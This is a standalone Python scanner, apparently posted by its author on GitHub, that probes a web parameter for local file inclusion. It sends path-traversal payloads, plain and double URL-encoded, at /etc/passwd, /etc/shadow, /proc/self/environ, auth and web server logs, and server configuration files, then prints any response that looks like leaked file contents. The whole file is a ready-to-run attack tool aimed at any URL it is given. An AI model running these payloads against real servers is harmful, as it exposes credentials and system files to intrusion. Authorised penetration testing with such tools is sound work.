import requests
import urllib.parse
import sys
from colorama import Fore, Style, init

init(autoreset=True)

def double_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def build_payloads(base_payloads, encodings=["normal", "double"]):
    final_payloads = []
    for payload in base_payloads:
        if "normal" in encodings:
            final_payloads.append((payload, "normal"))
        if "double" in encodings:
            final_payloads.append((double_encode(payload), "double"))
    return final_payloads

def scan(url, param, base_payloads):
    payloads = build_payloads(base_payloads)
    print(f"{Fore.CYAN}[+] Starting LFI Scan on {url}\n")

    for payload, mode in payloads:
        params = {param: payload}
        try:
            response = requests.get(url, params=params, timeout=10)
            full_url = response.url
            print(f"{Fore.YELLOW}[*] Testing payload ({mode}): {full_url}")

            if response.status_code == 200 and any(keyword in response.text for keyword in ["root:x", "127.0.0.1", "[apache", "[client", "PATH=", "USER="]):
                print(f"{Fore.GREEN}[+] Possible LFI detected with payload ({mode}): {full_url}")
                print(f"{Fore.GREEN}[+] Snippet:\n{Fore.RESET}{response.text[:500]}")
                print(f"{Fore.GREEN}[+] ---")
            else:
                print(f"{Fore.RED}[-] Not vulnerable with payload ({mode}).")
        except Exception as e:
            print(f"{Fore.RED}[!] Error with payload ({mode}): {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"{Fore.RED}[+] Made By Clyde.")
        print(f"{Fore.RED}[+] Github: https://github.com/clydedc")
        print(f"{Fore.CYAN}Usage: python3 {sys.argv[0]} <URL> <param>")
        print(f"{Fore.CYAN}Example: python3 {sys.argv[0]} https://target.com/index.php page")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    base_payloads = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../proc/version",
    "../../../../../../../../proc/cpuinfo",
    "../../../../../../../../var/log/auth.log",
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/apache2/error.log",
    "../../../../../../../../var/log/httpd/access_log",
    "../../../../../../../../var/log/httpd/error_log",
    "../../../../../../../../etc/mysql/my.cnf",
    "../../../../../../../../etc/httpd/conf/httpd.conf",
    "../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../etc/php.ini",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../boot.ini",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../windows/system32/drivers/etc/services",
    "../../../../../../../../etc/ssl/openssl.cnf",
    "../../../../../../../../usr/local/apache2/conf/httpd.conf",
    "../../../../../../../../usr/local/etc/apache22/httpd.conf",
    "../../../../../../../../opt/lampp/etc/httpd.conf",
]


    scan(url, param, base_payloads)
